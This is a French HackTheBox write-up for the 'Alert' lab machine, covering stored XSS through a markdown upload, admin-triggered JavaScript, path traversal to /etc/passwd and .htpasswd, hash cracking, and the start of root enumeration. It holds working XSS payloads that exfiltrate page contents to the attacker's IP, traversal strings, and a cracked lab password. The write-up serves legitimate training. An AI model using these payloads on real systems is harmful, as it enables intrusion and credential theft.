<!doctype html><html lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#ff7800 name=theme-color><meta content=#ffa348 media=(prefers-color-scheme:dark) name=theme-color><meta content="default-src 'none';font-src 'self';img-src 'self' https: data:;media-src 'self' https:;style-src 'self' 'unsafe-inline';frame-src https://player.vimeo.com https://www.youtube-nocookie.com https://toot.community;frame-ancestors 'none';base-uri 'none';form-action 'none';connect-src 'self' https://toot.community;script-src 'self' 'self'" http-equiv=content-security-policy><title>Machine - alert - Chez M. Dec</title><link href=https://nathandecou.github.io/blog/cyber/writeup_htb/alert/ rel=canonical><link href=https://nathandecou.github.io/blog/favicon.png rel=icon type=image/png><link href=https://nathandecou.github.io/blog/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><style>:root{--accent-color:#ff7800}[data-theme=dark]{--accent-color:#ffa348}@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--accent-color:#ffa348}}</style><link href=https://nathandecou.github.io/blog/style.css rel=stylesheet><link media="(prefers-color-scheme: light)" href=https://nathandecou.github.io/blog/syntax-theme-light.css rel=stylesheet><link media="(prefers-color-scheme: dark)" href=https://nathandecou.github.io/blog/syntax-theme-dark.css rel=stylesheet><script defer src=https://nathandecou.github.io/blog/closable.js></script><script defer src=https://nathandecou.github.io/blog/copy-button.js></script><script defer src=https://nathandecou.github.io/blog/fuse.js></script><script defer src=https://nathandecou.github.io/blog/search-fuse.js></script><script defer src=https://nathandecou.github.io/blog/theme-switcher.js></script><meta content="Chez M. Dec" property=og:site_name><meta content="Machine - alert - Chez M. Dec" property=og:title><meta content=https://nathandecou.github.io/blog/cyber/writeup_htb/alert/ property=og:url><meta property=og:description><meta content=https://nathandecou.github.io/blog/card.png property=og:image><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main-content tabindex=0> Skip to Main Content </a><ul><li id=home><a href=https://nathandecou.github.io/blog> <i class=icon></i>Chez M. Dec</a><li class=divider><li><a href=https://nathandecou.github.io/blog/osint/>OSINT</a><li><a href=https://nathandecou.github.io/blog/cyber/>Cybersecurite</a><li><a href=https://nathandecou.github.io/blog/dev/>Dev</a><li id=search><button class=circle id=search-toggle title=Search><i class=icon></i></button><li id=theme-switcher><details class=closable><summary class=circle title=Theme><i class=icon></i></summary> <ul><li><button title="Switch to Light Theme" class=circle id=theme-light><i class=icon></i></button><li><button title="Switch to Dark Theme" class=circle id=theme-dark><i class=icon></i></button><li><button title="Use System Theme" class=circle id=theme-system><i class=icon></i></button></ul></details></ul></nav><div id=search-container><label class=visually-hidden for=search-bar>Search</label><input placeholder="Search for…" autocomplete=off disabled id=search-bar type=search><div id=search-results-container><div id=search-results></div></div></div></header><main id=main-content><h1>Machine - alert</h1><h2 id=machine>Machine</h2><ul><li>URL : <a href=https://app.hackthebox.com/machines/linkvortex>Linkvortex</a><li>Difficulté : easy</ul><h2 id=enumeration>Enumeration</h2><p>On utilise nmap pour lister le nombre de ports TCP ouverts : <code>nmap &LTIP></code>. Il y a 2 ports ouverts (80 et 22).<p>Un serveur web écoute sur le port 80. En se rendant sur <code>http://&LTIP></code>, on est redirigé vers <code>http://alert.htb</code>.<p>On utilise <code>gobuster</code> pour chercher si d’autres vhost existent. On trouve que le vhost <code>statistics.alert.htb</code> existe, mais nous n’avons pas le droit d’y acceder. Une popup demandant un couple login/password protège la page.<h2 id=analyse-de-alert-htb>Analyse de alert.htb</h2><p>Voici la page d’accueil du site.</p><img class=no-hover src=homepage.jpg><p>Il s’agit d’un formulaire qui permet d’envoyer un fichier markdown, le serveur s’occupe ensuite de convertir le markdown en html et nous renvoie le resultat. Il nous fourni aussi un lien pour partager le resultat.<p>En lançant une recherche de répértoire avec <code>dirsearch -u http://alert.htb</code> on trouve les pages suivantes.</p><img class=no-hover src=dirsearch.jpg><p>On y voit plusieurs pages dont nous n’avions pas connaissance : <code>/messages</code>, <code>/messages.php</code> et <code>/uploads</code>. Les pages <code>/messages</code> et <code>/uploads</code> renvoie vers des 403. La page <code>/message.php</code> vers une page vide. On laisse ça de coté pour le moment.<h3 id=xss-via-le-formulaire-d-upload>XSS via le formulaire d’upload</h3><p>En uploadant un fichier markdown avec comme contenu :<pre class="language-md z-code" data-lang=md><code class=language-md data-lang=md><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-meta z-tag z-script z-begin z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-script z-html">script</span></span><span class="z-meta z-tag z-script z-begin z-html"><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-js"><span class="z-variable z-function z-js">alert</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-string z-js"><span class="z-string z-quoted z-single z-js"><span class="z-punctuation z-definition z-string z-begin z-js">'</span>XSS :)<span class="z-punctuation z-definition z-string z-end z-js">'</span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span>
</span></span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-js"></span></span></span><span class="z-meta z-tag z-script z-end z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-script z-html">script</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span></span><span class="z-meta z-disable-markdown">
</span></span></code></pre><p>Le serveur nous renvoie cette page :</p><img class=no-hover src=xss_poc.jpg><p>Nous savons donc qu’il est possible d’injecter du javascript dans le markdown et qu’il sera présent aussi après conversion. Cependant, pour que ça serve à quelque chose il faut que ce code javascript soit executé sur la machine de quelqu’un d’autre que la notre (un admin du site par exemple…)<h3 id=page-de-contact>Page de contact</h3><p>Dans la page <code>about</code> du site on peut lire <code>"If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours"</code>.<p>Nous pouvons donc tenter de faire ouvrir cette page infecter à l’administrateur en utilisant la page de contact.</p><img class=no-hover src=contact_page.jpg><p>Pour cela nous pouvons envoyer le lien de partage de notre document à l’admin via la page de contact, en esperant qu’il l’ouvre. Il nous faut donc un moyen de prouver qu’il a bien ouvert notre lien.<p>Pour verifier que l’admin ouvre notre lien, on peut utiliser la commande <code>fetch</code> dans notre payload javascript, qui sert à requeter une URL. En requetant une URL dont on peut superviser l’accès on saura si l’administrateur a cliqué sur le lien.<p>On peut faire tourner un serveur http en python (<code>python3 -m http.server</code>) et donner l’URL de ce serveur.<p>Voici le payload utilisé dans le markdown.<pre class="language-md z-code" data-lang=md><code class=language-md data-lang=md><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-meta z-tag z-script z-begin z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-script z-html">script</span></span><span class="z-meta z-tag z-script z-begin z-html"><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-js"><span class="z-variable z-function z-js">fetch</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-string z-js"><span class="z-string z-quoted z-single z-js"><span class="z-punctuation z-definition z-string z-begin z-js">'</span>http://&LTMYIP>:5000<span class="z-punctuation z-definition z-string z-end z-js">'</span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span><span class="z-punctuation z-terminator z-statement z-js">;</span>
</span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"></span></span><span class="z-meta z-tag z-script z-end z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-script z-html">script</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span></span><span class="z-meta z-disable-markdown">
</span></span></code></pre><p>Il nous faut donc envoyer ce payload via la page d’upload (<code>http://alert.htb?page=alert</code>). Récupérer le lien de partage, envoyer ce lien via le formulaire de contact puis attendre de voir si notre lien est requeté.</p><img class=no-hover src=mail_contact.jpg><img class=no-hover src=pingback.jpg><p>On peut voir que notre serveur a bien été requeté. On sait donc que notre lien a été ouvert.<h3 id=enumeration-via-xss>Enumération via XSS</h3><p>Il nous faut maintenant trouvé un moyen d’exploiter cette XSS.<p>Pendant l’énumération de pages sur le site au début de ce rapport, nous avions trouvé les pages <code>/messages</code>, <code>/uploads</code> et <code>/messages.php</code>. Nous allons faire ouvrir ces pages par l’admin puis lui faire nous renvoyer le contenu pour voir si ce qu’il voit est different de ce que nous voyons.<p>Pour ça on utilise le payload suivant dans le markdown. Avec <code>&LTPATH></code> la page que l’on souhaite récupérer. Ce script va requeter la page voulue, puis requeter notre serveur avec comme paramètre d’URL le contenu de la page en question. Puisque nous controllons notre serveur il est simple de récupérer ce paramètre.<pre class="language-md z-code" data-lang=md><code class=language-md data-lang=md><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-meta z-tag z-script z-begin z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-script z-html">script</span></span><span class="z-meta z-tag z-script z-begin z-html"><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-js"><span class="z-variable z-function z-js">fetch</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-string z-js"><span class="z-string z-quoted z-double z-js"><span class="z-punctuation z-definition z-string z-begin z-js">"</span>http://alert.htb/&LTPATH><span class="z-punctuation z-definition z-string z-end z-js">"</span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span>  </span><span class="z-keyword z-operator z-relational z-js"><</span><span class="z-keyword z-operator z-arithmetic z-js">--</span><span class="z-keyword z-operator z-arithmetic z-js">--</span> <span class="z-variable z-other z-constant z-js">REQUETE</span> <span class="z-variable z-other z-constant z-js">LA</span> <span class="z-variable z-other z-constant z-js">PAGE</span> <span class="z-variable z-other z-constant z-js">VOULUE</span>
</span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-punctuation z-accessor z-js">.</span><span class="z-meta z-function-call z-method z-js"><span class="z-variable z-function z-js">then</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-function z-js"></span><span class="z-meta z-function z-declaration z-js"><span class="z-variable z-parameter z-function z-js">response</span> <span class="z-storage z-type z-function z-arrow z-js">=></span></span><span class="z-meta z-function z-js"> <span class="z-meta z-block z-js"><span class="z-meta z-function-call z-method z-js"><span class="z-variable z-other z-readwrite z-js">response</span><span class="z-punctuation z-accessor z-js">.</span><span class="z-variable z-function z-js">text</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span>
</span></span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-method z-js"></span><span class="z-punctuation z-accessor z-js">.</span><span class="z-meta z-function-call z-method z-js"><span class="z-variable z-function z-js">then</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-function z-js"></span><span class="z-meta z-function z-declaration z-js"><span class="z-variable z-parameter z-function z-js">data</span> <span class="z-storage z-type z-function z-arrow z-js">=></span></span><span class="z-meta z-function z-js"> <span class="z-meta z-block z-js"><span class="z-punctuation z-section z-block z-begin z-js">{</span>
</span></span></span></span></span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-method z-js"><span class="z-meta z-group z-js"><span class="z-meta z-function z-js"><span class="z-meta z-block z-js">    <span class="z-meta z-function-call z-js"><span class="z-variable z-function z-js">fetch</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-string z-js"><span class="z-string z-quoted z-double z-js"><span class="z-punctuation z-definition z-string z-begin z-js">"</span>http://10.10.14.60:8000/?file_content=<span class="z-punctuation z-definition z-string z-end z-js">"</span></span></span> <span class="z-keyword z-operator z-arithmetic z-js">+</span> <span class="z-meta z-function-call z-js"><span class="z-support z-function z-js">encodeURIComponent</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-variable z-other z-readwrite z-js">data</span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span><span class="z-punctuation z-terminator z-statement z-js">;</span> <span class="z-keyword z-operator z-relational z-js"><</span><span class="z-keyword z-operator z-arithmetic z-js">--</span><span class="z-keyword z-operator z-arithmetic z-js">--</span> <span class="z-variable z-other z-constant z-js">RENVOIE</span> <span class="z-variable z-other z-constant z-js">LE</span> <span class="z-variable z-other z-constant z-js">CONTENU</span>
</span></span></span></span></span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-method z-js"><span class="z-meta z-group z-js"><span class="z-meta z-function z-js"><span class="z-meta z-block z-js">   <span class="z-punctuation z-section z-block z-end z-js">}</span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span><span class="z-punctuation z-terminator z-statement z-js">;</span>
</span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"></span></span><span class="z-meta z-tag z-script z-end z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-script z-html">script</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span></span><span class="z-meta z-disable-markdown">
</span></span></code></pre><p>Voici les résultats que l’on obtient :<ul><li>page <code>/messages</code> : une 403 comme quand nous faisions la requete nous même<li>page <code>/uploads</code> : une 403 comme quand nous faisions la requete nous même<li>page <code>/messages.php</code> : une page dont le contenu est le suivant</ul><pre class="language-html z-code" data-lang=html><code class=language-html data-lang=html><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-block z-any z-html">h1</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>Messages<span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-block z-any z-html">h1</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-block z-any z-html">ul</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span><span class="z-text z-html z-basic">    <span class="z-meta z-tag z-inline z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-inline z-any z-html">li</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span><span class="z-meta z-tag z-inline z-a z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-inline z-a z-html">a</span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">href</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-single z-html"><span class="z-punctuation z-definition z-string z-begin z-html">'</span>messages.php?file=2024-03-10_15-48-34.txt<span class="z-punctuation z-definition z-string z-end z-html">'</span></span></span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>2024-03-10_15-48-34.txt<span class="z-meta z-tag z-inline z-a z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-inline z-a z-html">a</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span><span class="z-meta z-tag z-inline z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-inline z-any z-html">li</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-block z-any z-html">ul</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></code></pre><p>La page contient une liste avec des dates et des liens. On voit que la page <code>/messages.php</code> accepte un paramètre d’url <code>file</code> avec un nom de fichier. Essayons d’en abuser pour lire des fichiers du système.<p>On utilisera le payload suivant :<pre class="language-md z-code" data-lang=md><code class=language-md data-lang=md><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-meta z-tag z-script z-begin z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-script z-html">script</span></span><span class="z-meta z-tag z-script z-begin z-html"><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-js"><span class="z-variable z-function z-js">fetch</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-string z-js"><span class="z-string z-quoted z-double z-js"><span class="z-punctuation z-definition z-string z-begin z-js">"</span>http://alert.htb/messages.php?file=../../../../../etc/passwd<span class="z-punctuation z-definition z-string z-end z-js">"</span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span>  </span><span class="z-keyword z-operator z-relational z-js"><</span><span class="z-keyword z-operator z-arithmetic z-js">--</span><span class="z-keyword z-operator z-arithmetic z-js">--</span> <span class="z-variable z-other z-constant z-js">REQUETE</span> <span class="z-variable z-other z-constant z-js">LA</span> <span class="z-variable z-other z-constant z-js">PAGE</span> <span class="z-variable z-other z-constant z-js">VOULUE</span>
</span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-punctuation z-accessor z-js">.</span><span class="z-meta z-function-call z-method z-js"><span class="z-variable z-function z-js">then</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-function z-js"></span><span class="z-meta z-function z-declaration z-js"><span class="z-variable z-parameter z-function z-js">response</span> <span class="z-storage z-type z-function z-arrow z-js">=></span></span><span class="z-meta z-function z-js"> <span class="z-meta z-block z-js"><span class="z-meta z-function-call z-method z-js"><span class="z-variable z-other z-readwrite z-js">response</span><span class="z-punctuation z-accessor z-js">.</span><span class="z-variable z-function z-js">text</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span>
</span></span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-method z-js"></span><span class="z-punctuation z-accessor z-js">.</span><span class="z-meta z-function-call z-method z-js"><span class="z-variable z-function z-js">then</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-function z-js"></span><span class="z-meta z-function z-declaration z-js"><span class="z-variable z-parameter z-function z-js">data</span> <span class="z-storage z-type z-function z-arrow z-js">=></span></span><span class="z-meta z-function z-js"> <span class="z-meta z-block z-js"><span class="z-punctuation z-section z-block z-begin z-js">{</span>
</span></span></span></span></span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-method z-js"><span class="z-meta z-group z-js"><span class="z-meta z-function z-js"><span class="z-meta z-block z-js">    <span class="z-meta z-function-call z-js"><span class="z-variable z-function z-js">fetch</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-meta z-string z-js"><span class="z-string z-quoted z-double z-js"><span class="z-punctuation z-definition z-string z-begin z-js">"</span>http://10.10.14.60:8000/?file_content=<span class="z-punctuation z-definition z-string z-end z-js">"</span></span></span> <span class="z-keyword z-operator z-arithmetic z-js">+</span> <span class="z-meta z-function-call z-js"><span class="z-support z-function z-js">encodeURIComponent</span><span class="z-meta z-group z-js"><span class="z-punctuation z-section z-group z-begin z-js">(</span><span class="z-variable z-other z-readwrite z-js">data</span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span><span class="z-punctuation z-terminator z-statement z-js">;</span> <span class="z-keyword z-operator z-relational z-js"><</span><span class="z-keyword z-operator z-arithmetic z-js">--</span><span class="z-keyword z-operator z-arithmetic z-js">--</span> <span class="z-variable z-other z-constant z-js">RENVOIE</span> <span class="z-variable z-other z-constant z-js">LE</span> <span class="z-variable z-other z-constant z-js">CONTENU</span>
</span></span></span></span></span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"><span class="z-meta z-function-call z-method z-js"><span class="z-meta z-group z-js"><span class="z-meta z-function z-js"><span class="z-meta z-block z-js">   <span class="z-punctuation z-section z-block z-end z-js">}</span></span></span><span class="z-punctuation z-section z-group z-end z-js">)</span></span></span><span class="z-punctuation z-terminator z-statement z-js">;</span>
</span></span></span></span><span class="z-text z-html z-markdown"><span class="z-meta z-disable-markdown"><span class="z-source z-js z-embedded z-html"><span class="z-source z-js"></span></span><span class="z-meta z-tag z-script z-end z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-script z-html">script</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span></span><span class="z-meta z-disable-markdown">
</span></span></code></pre><p>On obtient le resultat suivant :</p><img class=no-hover src=passwd.jpg><p>Il s’agit du fichier <code>/etc/passwd</code> encodé comme paramètre de notre URL. Nous pouvons donc lire des fichiers du système via cette vulnérabilité.<p>La façon de faire étant assez laborieuse (générer le payload, envoyer le markdown, récupérer le lien, l’envoyer via le formulaire puis décoder le paramètre). J’ai rapidement developper 2 scripts python qui permettent d’automatiser le processus. Les voici <a href=https://nathandecou.github.io/blog/cyber/writeup_htb/alert/explorer_server.py>server</a> et <a href=https://nathandecou.github.io/blog/cyber/writeup_htb/alert/explorer_client.py>client</a>.<p>Le premier script est un serveur <a href=https://flask.palletsprojects.com/en/stable/>Flask</a> qui automatise le processus puis ajoute le contenu du fichier demandé dans une variable. Le second est un simple script qui va requeter le serveur avec un nom de fichier a lire.<p>En utilisant ces deux scripts, nous pouvons commencer à explorer et à chercher du contenu qui pourrait nous interesser.<p>Au début de ce rapport en énumérant nous avons trouver l’url <code>statistics.alert.htb</code> qui était inaccessible car protégé par le serveur web. Nous allons chercher le fichier <code>.htpasswd</code> qui nous permettrait de connaitre les identifiants pour y acceder. On le trouve en utilisant le chemin <code>../../../../var/www/statistics.alert.htb/.htpasswd</code>.</p><img class=no-hover src=htpasswd.jpg><h2 id=acces-au-serveur>Accès au serveur</h2><h3 id=flag-user>Flag user</h3><p>On peut trouver le mot de passe en clair d’Albert en utilisant la commande <code>hashcat -m 1600 -a 0 hash.txt rockyou.txt</code>.<p>Le mot de passe trouvé est <code>manchesterunited</code>. Comme souvent dans les machines HackTheBox, ce mot de passe est aussi celui d’albert pour l’accès SSH.<p>On a donc accès à la machine en SSH et on récupère le flag user.</p><img class=no-hover src=user_logged.jpg><h3 id=flag-root>Flag root</h3><p>En faisant <code>id</code> en tant que l’utilisateur albert, on voit qu’il appartient au groupe <code>management</code>.<p>On peut lister les fichiers dont le groupe est <code>management</code> pour voir à quoi l’on a accès via ce groupe.<pre class="language-sh z-code" data-lang=sh><code class=language-sh data-lang=sh><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">albert@alert:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> find /<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>group</span> management <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">></span>/dev/null</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/opt/website-monitor/config</span></span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/opt/website-monitor/config/configuration.php</span></span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">albert@alert:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /opt/website-monitor/config</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">total</span></span><span class="z-meta z-function-call z-arguments z-shell"> 12</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">drwxrwxr-x</span></span><span class="z-meta z-function-call z-arguments z-shell"> 2 root management 4096 Jan 22 10:56 .</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">drwxrwxr-x</span></span><span class="z-meta z-function-call z-arguments z-shell"> 7 root root       4096 Oct 12 01:07 ..</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">-rwxrwxr-x</span></span><span class="z-meta z-function-call z-arguments z-shell"> 1 root management   49 Jan 22 10:56 configuration.php</span>
</span></code></pre><p>Le user <code>albert</code> (via son appartenance au groupe <code>management</code>) peut donc écrire des fichiers dans le dossier <code>/opt/website-monitor/config</code>.<p>On va lister les processus pour voir si on peut trouver une mention de ce dossier.<pre class="language-sh z-code" data-lang=sh><code class=language-sh data-lang=sh><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">albert@alert:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ps aux</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> monitor</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root</span></span><span class="z-meta z-function-call z-arguments z-shell">         988  0.0  0.6 207156 26580 <span class="z-keyword z-operator z-regexp z-quantifier z-shell">?</span>        Ss   04:01   0:00 /usr/bin/php<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>S</span> 127.0.0.1:8080<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>t</span> /opt/website-monitor <span class="z-keyword z-operator z-assignment z-redirection z-shell"><</span><span class="z-punctuation z-terminator z-file-descriptor z-shell">-</span>--- POINT D<span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">'</span>ENTREE !!
</span></span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-arguments z-shell"><span class="z-string z-quoted z-single z-shell">root        1040  0.0  0.0   2636   720 ?        S    04:01   0:00 inotifywait -m -e modify --format %w%f %e /opt/website-monitor/config
</span></span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-arguments z-shell"><span class="z-string z-quoted z-single z-shell">root       11612  0.0  0.2 207156 10428 ?        Ss   10:53   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
</span></span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-arguments z-shell"><span class="z-string z-quoted z-single z-shell">root       11703  0.0  0.2 207156  8096 ?        Ss   10:54   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
</span></span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-arguments z-shell"><span class="z-string z-quoted z-single z-shell">albert     12219  0.0  0.0   8160  2404 pts/0    S+   10:58   0:00 grep --color=auto monitor
